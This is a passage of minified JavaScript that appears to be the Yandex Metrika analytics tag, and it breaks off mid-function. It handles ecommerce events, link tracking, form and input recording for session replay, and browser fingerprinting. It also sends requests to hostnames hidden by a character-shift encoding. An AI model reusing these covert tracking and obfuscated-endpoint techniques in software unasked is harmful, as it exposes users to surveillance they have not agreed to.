          (n = n[1]), (t[r] = { Sa: n, fd: e });
          var i = q(r);
          return i !== r && (t[i] = { Sa: q(n), fd: e }), t;
        }, {});
      }
      function Y(t, e) {
        for (
          var n = [], r = t.split(""), i = e.split(""), o = 0, a = 0;
          a < t.length && !(o >= i.length);
          a += 1
        ) {
          var u = r[a];
          "0" <= u && "9" >= u ? (n.push(i[o]), (o += 1)) : n.push(r[a]);
        }
        return iu("", n) + e.slice(o + 1);
      }
      function q(t) {
        var e = { 7: "8", 8: "7" };
        return 11 === t.length && e[t[0]] ? "" + e[t[0]] + t.slice(1) : t;
      }
      function K(t) {
        return new RegExp("(?:" + iu("|", Vu(Vp, Mu(t))) + ")");
      }
      function W(t, e, n, r) {
        if (e) {
          var i = [];
          e &&
            (t.document.documentElement.contains(e)
              ? J(t, e, yo("push", i), r)
              : Ji(i, $(t, e, r))),
            zu(n, i);
        }
      }
      function J(t, e, n, r, i) {
        function o(e) {
          return ko(r)
            ? r(e)
              ? t.NodeFilter.FILTER_ACCEPT
              : t.NodeFilter.FILTER_REJECT
            : t.NodeFilter.FILTER_ACCEPT;
        }
        if (
          (void 0 === i && (i = -1),
          ko(n) && o(e) === t.NodeFilter.FILTER_ACCEPT && (n(e), !Mi(e)))
        )
          for (
            e = t.document.createTreeWalker(
              e,
              i,
              r ? { acceptNode: o } : null,
              !1
            );
            e.nextNode() && !1 !== n(e.currentNode);

          );
      }
      function $(t, e, n) {
        var r = [],
          i = po(Ho, yo("push", r));
        if (
          (ko(n)
            ? (_o((n = n(e))) || n === t.NodeFilter.FILTER_ACCEPT) && i(e)
            : i(e),
          e.childNodes && 0 < e.childNodes.length)
        ) {
          n = 0;
          for (var o = (e = e.childNodes).length; n < o; n += 1) {
            var a = $(t, e[n]);
            zu(i, a);
          }
        }
        return r;
      }
      function Z(t, e) {
        void 0 === e && (e = t);
        var n = (e.nodeType ? "contentWindow." : "") + "document.body";
        return new us(function r(i) {
          mo(e, n) ? i() : Br(t, wo(i, r), 100);
        });
      }
      function Q(t, e) {
        function n(i) {
          mo(e, r) ? i() : Br(t, wo(i, n), 100);
        }
        void 0 === e && (e = t);
        var r = (e.nodeType ? "contentWindow." : "") + "document.body";
        return cu(function (t, e) {
          n(e);
        });
      }
      function tt(t, e, n) {
        return ii(t, e, ["i", "n", "p"], void 0, n);
      }
      function et(t, e, n) {
        return function (r) {
          var i,
            o,
            a = vn(e, n);
          a &&
            (function (t, e, n) {
              var r = !1,
                i = "";
              if (!Ao(e))
                return an(n, "", "Ecommerce data should be an object"), r;
              var o = e.goods;
              switch (t) {
                case "detail":
                case "add":
                case "remove":
                  lo(o) && o.length
                    ? (r = Iu(function (t) {
                        return Ao(t) && (No(t.id) || Wi(n, t.id) || No(t.name));
                      }, o)) ||
                      (i =
                        "All items in 'goods' should be objects and contain 'id' or 'name' field")
                    : (i =
                        "Ecommerce data should contain 'goods' non-empty array");
                  break;
                case "purchase":
                  Wi(n, e.id) || No(e.id)
                    ? (r = !0)
                    : (i =
                        "Purchase object should contain string or number 'id' field");
              }
              return an(n, "", i), r;
            })(t, r, e) &&
            ((a = yu(a.params, a)),
            (r = rt(t, r, "goods")) &&
              a &&
              a((((i = {}).__ym = (((o = {}).ecommerce = [r]), o)), i)));
        };
      }
      function nt(t, e, n) {
        var r,
          i,
          o = mo(n, "ecommerce") || {},
          a = mo(n, "event") || "";
        (o = (a = zf[a]) ? rt(a, o, "items") : void 0) ||
          ((o = n),
          !lo(n) && Wi(t, _u(n)) && (o = Oo(o)),
          (o =
            lo(o) && ((t = zf[o[1]]), "event" === o[0] && t)
              ? rt(t, o[2], "items")
              : void 0)),
          (n =
            o ||
            (function (t) {
              var e = mo(t, "ecommerce") || {};
              return (
                (t = Lu(Gu(Yf), Mu(e))),
                (t = Cu(
                  function (t, n) {
                    return (t[n] = e[n]), t;
                  },
                  {},
                  t
                )),
                Mu(t).length ? t : void 0
              );
            })(n)) &&
            e &&
            e((((r = {}).__ym = (((i = {}).ecommerce = [n]), i)), r));
      }
      function rt(t, e, n) {
        var r, i;
        if (e) {
          var o = e.purchase || e;
          e = Mu(o);
          var a = o[n];
          if (a) {
            var u = (((r = {})[t] = (((i = {}).products = Vu(it, a)), i)), r);
            return (
              1 < e.length &&
                (u[t].actionField = Cu(
                  function (t, e) {
                    return e === n
                      ? t
                      : "currency" === e
                      ? ((u.currencyCode = o.currency), t)
                      : ((t[Vf[e] || e] = o[e]), t);
                  },
                  {},
                  e
                )),
              u
            );
          }
        }
      }
      function it(t) {
        var e = {};
        return (
          zu(function (n) {
            var r = Vf[n] || n;
            -1 !== n.indexOf("item_category")
              ? ((r = Vf.item_category),
                (e[r] = e[r] ? e[r] + "/" + t[n] : t[n]))
              : (e[r] = t[n]);
          }, Mu(t)),
          e
        );
      }
      function ot(t, e) {
        var n = Dp(t),
          r = Fc(e),
          i = n[r];
        i || ((i = {}), (n[r] = i)),
          (i.ui = !0),
          (n = i.qg) && ((r = Ip(t)), zu(r, n));
      }
      function at(t, e, n, r) {
        var i;
        if ((t = vn(t, n))) {
          var o = r.data;
          n = "" + n.id;
          var a = r.sended || [];
          r.sended || (r.sended = a),
            Fu(n, a) ||
              !t.params ||
              (r.counter && "" + r.counter !== n) ||
              (t.params(o),
              a.push(n),
              r.parent && e.ng((((i = {}).type = "params"), (i.data = o), i)));
        }
      }
      function ut(t) {
        var e = qo,
          n = null,
          r = t.length;
        if (0 !== t.length && t[0]) {
          var i = t.slice(-1)[0];
          ko(i) && ((e = i), (r = t.length + -1));
          var o = t.slice(-2)[0];
          return (
            ko(o) && ((e = o), (n = i), (r = t.length + -2)),
            { sh: n, Ua: e, N: 1 === (r = t.slice(0, r)).length ? t[0] : vo(r) }
          );
        }
      }
      function ct(t, e, n) {
        var r = mo(t, "AppMetricaInitializer"),
          i = mo(r, "init");
        if (i)
          try {
            yu(i, r)(Oi(t, e));
          } catch (t) {}
        else td = Br(t, Eo([t, e, 2 * n], ct), n, "ai.d");
        return function () {
          return ro(t, td);
        };
      }
      function st(t, e, n) {
        if (n && (n = ni(t, (n = ri(t, n))))) {
          n = "?" + Li(n);
          var r = on(
            t,
            e,
            "Button goal. Counter " + e.id + ". Button: " + n + "."
          );
          md(t, e, "btn", r)(n);
        }
      }
      function ft(t, e) {
        var n = pf(t);
        if ("" !== n.l("cc")) return 0;
        var r = wo("cc", n.o);
        r(0);
        var i = mf(t),
          o = Pu(t);
        (o = po(
          Au(yp({ Vc: 1 }) + ".c"),
          au(function (t) {
            r(t + "&" + i(mr));
          }),
          wo("cc", o.o)
        )),
          Sl(
            t,
            "6",
            e
          )({})
            .then(o)
            .catch(
              po(
                au(function () {
                  var t = i(mr);
                  n.o("cc", "&" + t);
                }),
                Ur(t, "cc")
              )
            );
      }
      function ht(t, e) {
        var n;
        t((((n = {}).clickmap = !!gu(e) || e), n));
      }
      function lt(t, e, n, r, i) {
        function o() {
          c && c.stop();
        }
        if (!e.Ta) return us.resolve(qo);
        var a = Sl(t, "4", e),
          u = { F: { "wv-type": "0" }, H: Uc() };
        n = new Gd(t, n, function (n, r, i) {
          if (!a) return us.resolve();
          r = "wv-data=" + Dn(n, !0);
          for (var o, c, s, f = n.length, h = 0, l = 255, d = 255; f; ) {
            f -= o = 21 < f ? 21 : f;
            do {
              (c = "string" == typeof n ? n.charCodeAt(h) : n[h]),
                (h += 1),
                255 < c && ((s = c >> 8), (c &= 255), (c ^= s)),
                (d += l += c);
            } while (--o);
            (l = (255 & l) + (l >> 8)), (d = (255 & d) + (d >> 8));
          }
          return a(
            Nu({}, u, {
              $: r,
              F: {
                "wv-check":
                  65535 ===
                  (n = (((255 & l) + (l >> 8)) << 8) | ((255 & d) + (d >> 8)))
                    ? 0
                    : n,
                "wv-type": "0",
              },
            }),
            e,
            i
          ).catch(Ur(t, "m.n.m.s"));
        });
        var c = (function (t, e, n, r) {
          var i = t.document,
            o = [],
            a = os(t),
            u = ":submit" + Math.random(),
            c = [],
            s = yu(e.flush, e),
            f = Xo(function (n, i) {
              Ur(t, "hfv." + n, function () {
                try {
                  var t = i.type;
                } catch (t) {
                  return;
                }
                (t = Fu(t, r)), e.push(i, { type: n }), t && s();
              })();
            }),
            h = Ur(t, "sfv", function () {
              if (!Lf(t)) {
                var e = n(t),
                  r = hp(t);
                zu(function (t) {
                  o.push(a.C(t.target, [t.event], f(t.type)));
                }, e),
                  zu(function (e) {
                    o.push(
                      a.C(
                        e.target,
                        [e.event],
                        Ur(t, "hff." + e.type + "." + e.event, function (n) {
                          zu(cu({ b: t, ia: n, flush: s }), e.M);
                        })
                      )
                    );
                  }, r),
                  (c = oi(t, "form", i)),
                  i.attachEvent &&
                    ((e = oi(t, "form *", i)),
                    zu(function (t) {
                      o.push(a.C(t, ["submit"], f("form")));
                    }, c),
                    zu(function (t) {
                      Ts(t) && o.push(a.C(t, ["change"], f("formInput")));
                    }, e)),
                  zu(function (e) {
                    var n = e.submit;
                    (ko(n) || ("object" == typeof n && vp.test("" + n))) &&
                      ((e[u] = n),
                      (e.submit = Ur(t, "fv", function () {
                        var t = { target: e, type: "submit" };
                        return f("document")(t), e[u]();
                      })));
                  }, c);
              }
            }),
            l = Ur(t, "ufv", function () {
              zu(Wo, o),
                zu(function (t) {
                  t && (t.submit = t[u]);
                }, c),
                e.flush();
            });
          return { start: h, stop: l };
        })(t, n, r, i);
        return xn(t, e, function (e) {
          return (
            e && Pu(t).o("isEU", mo(e, "settings.eu")),
            !Gn(t) && c && dt(t, e) && c.start(),
            o
          );
        });
      }
      function dt(t, e) {
        var n = lf(t),
          r = n.l("visorc");
        Fu(r, ["w", "b"]) || (r = ""),
          (_r(t) && Rr(t, Tr, "visorc") && !mp.test(ic(t) || "")) || (r = "b");
        var i = mo(e, "settings.webvisor.recp");
        return (
          (!t.isFinite(i) || 0 > i || 1 < i) && (r = "w"),
          r || (r = (Pu(t).l("hitId") % 1e4) / 1e4 < i ? "w" : "b"),
          n.o("visorc", r, 30),
          "w" === r
        );
      }
      function pt(t, e) {
        var n = t.b,
          r = [],
          i = e.form;
        if (!e[Hd] && i) {
          var o = i.elements;
          i = i.length;
          for (var a = 0; a < i; a += 1) {
            var u = o[a];
            Ss(u) && !u[Hd] && Ji(r, Ia(n, u));
          }
        } else Ji(r, Ia(n, e));
        return r;
      }
      function vt(t) {
        if (ip) {
          ip = !1;
          var e = dr(t.b),
            n = [];
          return Ma(t.b, n, 15) ? (t = []) : (Na(n, e), (t = n)), t;
        }
      }
      function mt(t) {
        if (!ip) {
          (ip = !0), (t = dr(t.b));
          var e = [];
          return Ra(e, 14), Na(e, t), e;
        }
      }
      function gt(t, e, n) {
        var r = e[Hd];
        if (r) {
          t: {
            var i = dr(t),
              o = e[Hd];
            if (0 < o) {
              var a = [];
              e = di(t, e);
              var u = Ud[o],
                c = e[0] + "x" + e[1],
                s = e[2] + "x" + e[3];
              if (c !== u.Wf) {
                if (((u.Wf = c), Ma(t, a, 9))) {
                  t = [];
                  break t;
                }
                Na(a, i), Na(a, o), Na(a, e[0]), Na(a, e[1]);
              }
              if (s !== u.size) {
                if (((u.size = s), Ma(t, a, 10))) {
                  t = [];
                  break t;
                }
                Na(a, i), Na(a, o), Na(a, e[2]), Na(a, e[3]);
              }
              if (a.length) {
                t = a;
                break t;
              }
            }
            t = [];
          }
          Ji(n, t);
        }
        return r;
      }
      function bt(t, e, n) {
        if ((void 0 === n && (n = !1), "button" === e.getAttribute("type")))
          return { jb: !1, Cd: !1, Rd: !1 };
        var r = At(e),
          i = wt(e);
        return (t = yt(t, e) || (n && i)), { jb: !(r || !t), Cd: r, Rd: i };
      }
      function yt(t, e) {
        return !(!Ta(t, e) && !ka(t, e)) || _t(t, e);
      }
      function wt(t) {
        if (!t) return !1;
        var e = t.placeholder,
          n = t.type;
        return (
          (t = Lu(Et, [t.className, t.id, t.name])),
          (n && Fu(n, Vd)) || Wu(bo($d), t) || (Et(e) && Qd.test(e))
        );
      }
      function Et(t) {
        return !!(t && 2 < t.length);
      }
      function xt(t) {
        try {
          var e = bi(t);
          if (Fu(e, Rs)) {
            if ("INPUT" === e) {
              var n = t.type;
              return !n || Fu(n.toLocaleLowerCase(), Jd);
            }
            return !0;
          }
        } catch (t) {}
        return !1;
      }
      function Ct(t, e) {
        return e && Ti("(ym-disable-submit|-metrika-noform)", e);
      }
      function At(t) {
        return t && Ti("ym-record-keys", t);
      }
      function _t(t, e) {
        if (_o(e)) return !1;
        if (Mi(e)) {
          var n = e.parentNode;
          return !(!_o(n) && 11 === n.nodeType) && _t(t, e.parentNode);
        }
        if (zd.test(e.className)) return !0;
        if (!(n = xs(t))) return !1;
        var r = n.call(e, ".ym-hide-content *");
        return (
          (!r ||
            (!Yd.test(e.className) &&
              !n.call(e, ".ym-hide-content .ym-show-content *"))) &&
          r
        );
      }
      function kt(t, e) {
        var n = null;
        try {
          (n = e.target || e.srcElement) &&
            (!n.ownerDocument && n.documentElement
              ? (n = n.documentElement)
              : n.ownerDocument !== t.document && (n = null));
        } catch (t) {}
        return n;
      }
      function Tt(t) {
        var e = t.which;
        return (
          (t = t.button),
          e || void 0 === t
            ? e
            : 1 === t || 3 === t
            ? 1
            : 2 === t
            ? 3
            : 4 === t
            ? 2
            : 0
        );
      }
      function St(t, e) {
        var n = _i(t),
          r = xi(t);
        return {
          x: e.pageX || e.clientX + r.x - (n.clientLeft || 0) || 0,
          y: e.pageY || e.clientY + r.y - (n.clientTop || 0) || 0,
        };
      }
      function Rt(t) {
        var e = void 0;
        void 0 === e && (e = Od);
        var n = mo(t, "navigator") || {};
        (e = Vu(wo(n, mo), e)), (e = iu("x", e));
        try {
          var r =
            (Vo(mo(t, "navigator.getGamepads"), "getGamepads") &&
              t.navigator.getGamepads()) ||
            [];
        } catch (t) {
          r = [];
        }
        return e + "x" + _u(r);
      }
      function Mt(t) {
        try {
          var e = _u(t) ? t : [];
          return iu(",", [
            t.name,
            t.description,
            po(Zi, ju(Boolean), qu(Nt), uu(","))(e),
          ]);
        } catch (t) {
          return "";
        }
      }
      function Nt(t) {
        return iu(",", [t.description, t.suffixes, t.type]);
      }
      function Dt(t, e) {
        return (
          e.clearColor(0, 0, 0, 1),
          e.enable(e.DEPTH_TEST),
          e.depthFunc(e.LEQUAL),
          e.clear(e.COLOR_BUFFER_BIT | e.DEPTH_BUFFER_BIT),
          "[" + mo(t, "0") + ", " + mo(t, "1") + "]"
        );
      }
      function Pt(t) {
        return (t = mo(t, "screen") || {}), iu("x", Vu(wo(t, mo), Nd));
      }
      function It(t) {
        return (
          (t = mo(t, "navigator") || {}).doNotTrack ||
          t.msDoNotTrack ||
          "unknown"
        );
      }
      function Ot(t, e, n) {
        var r = n.Wa,
          i = mf(t),
          o = (function (t, e, n) {
            var r = e || {},
              i = Sl(t, "u", n),
              o = pf(t);
            return {
              l: function (t, e) {
                return gu(r[t]) ? o.l(t, e) : r[t];
              },
              o: function (e, n) {
                var a,
                  u = "" + n;
                return (
                  (r[e] = u),
                  o.o(e, u),
                  i(
                    { F: ((a = {}), (a.key = e), (a.value = u), a) },
                    [Pc.Ka + "//mc.yandex.ru/user_storage_set"],
                    {}
                  ).catch(Ur(t, "u.d.s.s"))
                );
              },
            };
          })(t, e.userData, r),
          a = (function (t) {
            var e = vc(t);
            return (
              (t = po(ac, Gu(["iPhone", "iPad"]))(t)), e ? yd : t ? wd : []
            );
          })(t);
        return a.length
          ? (function (t, e, n, r, i) {
              var o = i.Wd,
                a = i.Wa;
              return new us(function (i, u) {
                var c = n.l(o, 0);
                return (
                  (c = parseInt("" + c, 10)),
                  60 >= e(mr) - c
                    ? u()
                    : Qc(t)
                    ? i(void 0)
                    : _d(r)
                    ? u()
                    : i(Ad(t, a))
                );
              });
            })(t, i, o, e, n).then(function () {
              return (function (t, e, n, r, i) {
                var o = i.xj,
                  a = void 0 === o ? qo : o,
                  u = i.Wd,
                  c = r(gr);
                return (function (t, e, n) {
                  var r = n.Qc,
                    i = n.data,
                    o = Sl(t, r, n.Wa);
                  return (
                    (t = Nu({}, Ed)),
                    i && Nu(t.F, i),
                    (function (t) {
                      var e = [],
                        n = !1;
                      return cu(function (r, i) {
                        function o(n) {
                          e.push(n) === t.length && r(e);
                        }
                        zu(function (t) {
                          t(
                            Zn(o, function (t) {
                              if (!n)
                                try {
                                  i(t), (n = !0);
                                } catch (t) {
                                  o(t);
                                }
                            })
                          );
                        }, t);
                      });
                    })(
                      Vu(function (t) {
                        return (function (t) {
                          return cu(function (e, n) {
                            t.then(n, e);
                          });
                        })(
                          o(
                            Ed,
                            Vu(function (t) {
                              var e = t[1];
                              return (
                                "http" +
                                (t[2] ? "s" : "") +
                                "://" +
                                (t = iu(
                                  "",
                                  Vu(function (t) {
                                    return String.fromCharCode(
                                      t.charCodeAt(0) + 10
                                    );
                                  }, t[0].split(""))
                                )) +
                                ":" +
                                e +
                                "/" +
                                Cd[r]
                              );
                            }, t),
                            { Ig: !1, mj: !0 }
                          ).then(function (e) {
                            return Nu({}, e, { host: t[e.Pj] });
                          })
                        );
                      }, e)
                    )
                  );
                })(
                  t,
                  e,
                  i
                )(
                  Zn(
                    function (e) {
                      zu(function (e) {
                        e && Yr(t, u + ".s", e);
                      }, e),
                        (e = r(mr)),
                        n.o(u, e);
                    },
                    function (t) {
                      n.o(u, r(mr)), a(t, r, c);
                    }
                  )
                );
              })(t, a, o, i, n);
            }, qo)
          : us.resolve();
      }
      function Lt(t, e) {
        if (t.Hj()) {
          var n = null;
          try {
            n = e.target || e.srcElement;
          } catch (t) {}
          if (n) {
            3 === n.nodeType && (n = n.parentNode);
            for (
              var r = n && n.nodeName && ("" + n.nodeName).toLowerCase();
              mo(n, "parentNode.nodeName") &&
              (("a" !== r && "area" !== r) ||
                (!n.href && !n.getAttribute("xlink:href")));

            )
              r =
                (n = n.parentNode) &&
                n.nodeName &&
                ("" + n.nodeName).toLowerCase();
            var i = n.href ? n : null;
          } else i = null;
          if (i && !Ti("ym-disable-tracklink", i)) {
            var o = t.b,
              a = t.globalStorage;
            n = t.rh;
            var u = t.Wa,
              c = t.si,
              s = t.sender,
              f = t.Gh,
              h = u.qc,
              l = i.href;
            if (
              ((r =
                l ===
                (r = So(
                  i && i.innerHTML && i.innerHTML.replace(/<\/?[^>]+>/gi, "")
                ))
                  ? ""
                  : r),
              Ti("ym-external-link", i))
            )
              jt(o, u, { url: l, Fb: !0, title: r, sender: s });
            else {
              (h = h ? fa(o, h).hostname : Xi(o).hostname),
                (f = RegExp("\\.(" + iu("|", Vu(To, f)) + ")$", "i"));
              var d = i.protocol + "//" + i.hostname + i.pathname;
              (f = Pf.test(d) || Pf.test(l) || f.test(l) || f.test(d)),
                (i = i.hostname),
                Wc(h) === Wc(i)
                  ? f
                    ? jt(o, u, { url: l, Cc: !0, title: r, sender: s })
                    : ((c = (o = a.l("pai", qo)()) && o + "-" + c) &&
                        n.o("pai", c),
                      r && n.o("il", So(r).slice(0, 100)))
                  : (l && Df.test(l)) ||
                    jt(o, u, {
                      url: l,
                      Hc: !0,
                      Fb: !0,
                      Cc: f,
                      title: r,
                      sender: s,
                    });
            }
          }
        }
      }
      function jt(t, e, n, r) {
        var i,
          o = Uc();
        return (
          n.Cc && o.o("dl", "1"),
          n.Fb && o.o("ln", "1"),
          (o = {
            H: o,
            title: n.title,
            Hc: !!n.Hc,
            N: n.N,
            F:
              ((i = {}),
              (i["page-url"] = n.url),
              (i["page-ref"] = e.qc || Xi(t).href),
              i),
          }),
          (i = "Link"),
          n.Cc
            ? (i = n.Fb ? "Ext link - File" : "File")
            : n.Fb && (i = "Ext link"),
          rn(
            t,
            "cl.p.s",
            (e = n
              .sender(o, e)
              .then(r || qo)
              .then(on(t, e, i + ". Counter " + e.id + ". Url: " + n.url, n))),
            n.Ua || qo,
            n.b
          )
        );
      }
      function Bt(t, e) {
        var n,
          r,
          i =
            ((n = {}), (n.string = !0), (n.object = !0), (n.boolean = e), n)[
              typeof e
            ] || !1;
        t((((r = {}).trackLinks = i), r));
      }
      function Ft(t, e) {
        return function (n) {
          Ht(t, e, n);
        };
      }
      function Gt(t, e) {
        Ut(t)(function (t) {
          delete t[e];
        });
      }
      function Ht(t, e, n) {
        Ut(t)(function (t) {
          t[e] = Nu(t[e] || {}, n);
        });
      }
      function Ut(t) {
        var e = (t = Pu(t)).l("dsjf") || cu({});
        return t.Fa("dsjf", e), e;
      }
      function Xt(t) {
        return !!Bu(function (t) {
          return Fu(t.type, ["articleInfo", "publishersHeader"]);
        }, t);
      }
      function Vt(t) {
        var e = un(t).isEnabled,
          n = !1;
        try {
          n =
            (n = 2 === new t.Blob(["ä"]).size) &&
            2 === new t.Blob([new t.Uint8Array([1, 2])]).size;
        } catch (t) {}
        return Iu(Boolean, [
          !e,
          n,
          t.Uint8Array,
          mo(t, "Uint8Array.prototype.slice"),
        ]);
      }
      function zt(t, e) {
        var n = e[1][3],
          r = 0,
          i = new t.Uint8Array(e[0]);
        return Qn([n], function (e, n) {
          return e ? (e[0](t, e[2], i, r), (r += e[1]), n.push(e[3]), i) : i;
        });
      }
      function Yt(t, e, n) {
        t = e(n);
        var r = [0, (e = [qo, 0, 0]), e, void 0];
        return Qn(t, function (t, e) {
          var n = t[0],
            i = t[1],
            o = t[2];
          if (0 === n) return o(r, i), r;
          if (null == i) return r;
          var a = n >> 3;
          if (1 & n)
            Wt(r, Ye(a)), (i = o(i)), 2 & a && Wt(r, Ye(i[1])), Wt(r, i);
          else if (4 & n)
            for (n = i.length - 1; 0 <= n; ) {
              var u = o(i[n]);
              u.push([0, 0, Kt]),
                u.push([0, Ye(a), Wt]),
                u.unshift([0, 0, qt]),
                e.push.apply(e, u),
                --n;
            }
          else if (2 & n) {
            o = t[2];
            var c = t[3],
              s = t[4],
              f = t[5],
              h = Mu(i);
            for (n = h.length - 1; 0 <= n; )
              (u = [
                [0, 0, qt],
                [s, i[(u = h[n])], f],
                [o, u, c],
                [0, 0, Kt],
                [0, Ye(a), Wt],
              ]),
                e.push.apply(e, u),
                --n;
          } else
            (u = o(i)).push([0, 0, Kt]),
              u.push([0, Ye(a), Wt]),
              u.unshift([0, 0, qt]),
              e.push.apply(e, u);
          return r;
        });
      }
      function qt(t) {
        var e = t[1],
          n = t[0],
          r = t[2];
        t[3]
          ? ((t[0] = t[3][0]),
            (t[1] = t[3][1]),
            (t[2] = t[3][2]),
            (t[3] = t[3][3]))
          : ((t[0] = 0), (t[1] = [qo, 0, 0]), (t[2] = t[1])),
          Wt(t, Ye(n)),
          n && ((t[2][3] = e[3]), (t[2] = r), (t[0] += n));
      }
      function Kt(t) {
        (t[3] = [t[0], t[1], t[2], t[3]]),
          (t[1] = [qo, 0, 0]),
          (t[2] = t[1]),
          (t[0] = 0);
      }
      function Wt(t, e) {
        (t[0] += e[1]), (t[2][3] = e), (t[2] = e);
      }
      function Jt(t) {
        return [
          [385, t.Wg, Ye],
          [336, t.hj, ie],
          [272, t.Zg, ne],
          [208, t.event, Ae],
          [144, t.Ki, _e],
          [80, t.page, Pe],
        ];
      }
      function $t(t) {
        return [
          [321, t.end, He],
          [273, t.nh, Ge],
          [193, t.page, ze],
          [144, t.data, Jt],
          [65, t.K, ze],
        ];
      }
      function Zt(t) {
        return [[84, t.buffer, $t]];
      }
      function Qt(t) {
        return [
          [129, t.position, ze],
          [81, t.name, Fe],
        ];
      }
      function te(t) {
        return [[81, t.name, Fe]];
      }
      function ee(t) {
        return [[81, t.name, Fe]];
      }
      function ne(t) {
        return [
          [593, t.Nj, Fe],
          [532, t.nj, Qt],
          [449, t.af, ze],
          [401, t.gj, Fe],
          [340, t.Bj, te],
          [276, t.bh, ee],
          [209, t.cj, Fe],
          [145, t.dj, Fe],
          [65, t.id, Ye],
        ];
      }
      function re(t) {
        return [
          [513, t.af, ze],
          [489, t.Hi, Xe],
          [385, t.fb, ze],
          [321, t.height, ze],
          [257, t.width, ze],
          [193, t.y, ze],
          [129, t.x, ze],
          [65, t.id, Ye],
        ];
      }
      function ie(t) {
        return [
          [129, t.fb, ze],
          [84, t.$g, re],
        ];
      }
      function oe(t) {
        return [[81, t.hash, Fe]];
      }
      function ae(t) {
        return [
          [209, t.stack, Fe],
          [145, t.Bh, Fe],
          [81, t.code, Fe],
        ];
      }
      function ue(t) {
        return [
          [193, t.orientation, ze],
          [129, t.height, ze],
          [65, t.width, ze],
        ];
      }
      function ce(t) {
        return [[84, t.Fc, se]];
      }
      function se(t) {
        return [
          [273, t.Gc, Fe],
          [193, t.Kf, He],
          [145, t.key, Fe],
          [65, t.id, ze],
        ];
      }
      function fe(t) {
        return [
          [145, t.value, Fe],
          [81, t.Dk, Fe],
        ];
      }
      function he(t) {
        return [
          [149, t.Xb, Fe],
          [81, t.method, Fe],
        ];
      }
      function le(t) {
        return [
          [257, t.lb, ze],
          [193, t.mb, ze],
          [129, t.height, ze],
          [65, t.width, ze],
        ];
      }
      function de(t) {
        return [
          [144, t.Lg, pe],
          [80, t.Jg, pe],
        ];
      }
      function pe(t) {
        return [
          [193, t.y, ze],
          [129, t.x, ze],
          [105, t.level, Xe],
        ];
      }
      function ve(t) {
        return [[84, t.touches, me]];
      }
      function me(t) {
        return [
          [297, t.force, Xe],
          [233, t.y, Xe],
          [169, t.x, Xe],
          [81, t.id, Fe],
        ];
      }
      function ge(t) {
        return [
          [193, t.hidden, He],
          [129, t.checked, He],
          [81, t.value, Fe],
        ];
      }
      function be(t) {
        return [
          [257, t.hf, ze],
          [193, t.rg, ze],
          [129, t.end, ze],
          [65, t.start, ze],
        ];
      }
      function ye() {
        return [];
      }
      function we(t) {
        return [
          [193, t.page, He],
          [129, t.y, ze],
          [65, t.x, ze],
        ];
      }
      function Ee(t) {
        return [
          [129, t.y, ze],
          [65, t.x, ze],
        ];
      }
      function xe(t) {
        return [[84, t.Aa, Ce]];
      }
      function Ce(t) {
        return [
          [257, t.index, ze],
          [209, t.ie, Fe],
          [145, t.style, Fe],
          [65, t.target, ze],
        ];
      }
      function Ae(t) {
        return [
          [1168, t.vj, xe],
          [1104, t.ri, oe],
          [1040, t.Fh, ae],
          [976, t.uh, ue],
          [912, t.Ei, ce],
          [848, t.jj, le],
          [784, t.Xj, de],
          [720, t.Ek, fe],
          [656, t.Ak, he],
          [592, t.Cj, ve],
          [528, t.jh, ge],
          [464, t.qj, be],
          [400, t.Uj, ye],
          [336, t.oj, we],
          [272, t.Ii, Ee],
          [193, t.L, Ve],
          [129, t.target, Ve],
          [65, t.type, Ye],
        ];
      }
      function _e(t) {
        return [
          [257, t.L, Ve],
          [208, t.Y, ke],
          [129, t.K, ze],
          [65, t.target, ze],
        ];
      }
      function ke(t) {
        return [
          [148, t.Aa, Te],
          [65, t.index, ze],
        ];
      }
      function Te(t) {
        return [
          [276, t.d, Se],
          [212, t.nd, Re],
          [148, t.Ye, Ne],
          [84, t.Ve, De],
        ];
      }
      function Se(t) {
        return [
          [193, t.wa, ze],
          [144, t.ec, Me],
          [65, t.id, ze],
        ];
      }
      function Re(t) {
        return [
          [193, t.wa, ze],
          [146, t.vb, 81, Fe, 144, Me],
          [65, t.id, ze],
        ];
      }
      function Me(t) {
        return [
          [193, t.r, He],
          [145, t.n, Fe],
          [81, t.Jc, Fe],
        ];
      }
      function Ne(t) {
        return [
          [641, t.Ma, He],
          [577, t.wa, ze],
          [513, t.ae, ze],
          [465, t.ec, Fe],
          [402, t.vb, 81, Fe, 145, Fe],
          [321, t.me, ze],
          [273, t.Sf, Fe],
          [193, t.je, ze],
          [145, t.Rf, Fe],
          [65, t.id, ze],
        ];
      }
      function De(t) {
        return [
          [321, t.wa, ze],
          [257, t.je, ze],
          [193, t.ae, ze],
          [129, t.me, ze],
          [65, t.id, ze],
        ];
      }
      function Pe(t) {
        return [
          [321, t.ya, Ue],
          [273, t.bd, Fe],
          [193, t.L, Ve],
          [148, t.content, Ie],
          [80, t.Y, Oe],
        ];
      }
      function Ie(t) {
        return [
          [513, t.hidden, He],
          [449, t.oe, ze],
          [385, t.next, ze],
          [337, t.content, Fe],
          [257, t.parent, ze],
          [210, t.attributes, 81, Fe, 145, Fe],
          [145, t.name, Fe],
          [65, t.id, ze],
        ];
      }
      function Oe(t) {
        return [
          [724, t.wk, Le],
          [656, t.location, je],
          [592, t.viewport, Be],
          [528, t.screen, Be],
          [449, t.Cf, He],
          [401, t.Ze, Fe],
          [337, t.referrer, Fe],
          [273, t.Dg, Fe],
          [209, t.We, Fe],
          [145, t.title, Fe],
          [81, t.doctype, Fe],
        ];
      }
      function Le(t) {
        return [
          [133, t.scroll, ze],
          [65, t.target, ze],
        ];
      }
      function je(t) {
        return [
          [209, t.path, Fe],
          [145, t.protocol, Fe],
          [81, t.host, Fe],
        ];
      }
      function Be(t) {
        return [
          [129, t.height, ze],
          [65, t.width, ze],
        ];
      }
      function Fe(t) {
        var e = Fl({}, t, [], 0);
        return e ? [Bl, e, t] : [Ke, 0, 0];
      }
      function Ge(t) {
        return [We, t.length, t];
      }
      function He(t) {
        return [Ke, 1, t ? 1 : 0];
      }
      function Ue(t) {
        var e = (t = en(t))[0],
          n = t[1],
          r = ((n >>> 28) | (e << 4)) >>> 0;
        return [
          tn,
          0 === (e >>>= 24)
            ? 0 === r
              ? 16384 > n
                ? 128 > n
                  ? 1
                  : 2
                : 2097152 > n
                ? 3
                : 4
              : 16384 > r
              ? 128 > r
                ? 5
                : 6
              : 2097152 > r
              ? 7
              : 8
            : 128 > e
            ? 9
            : 10,
          t,
        ];
      }
      function Xe(t) {
        return [$e, 4, t];
      }
      function Ve(t) {
        return Ye(((t << 1) ^ (t >> 31)) >>> 0);
      }
      function ze(t) {
        return 0 > t ? [tn, 10, en(t)] : Ye(t);
      }
      function Ye(t) {
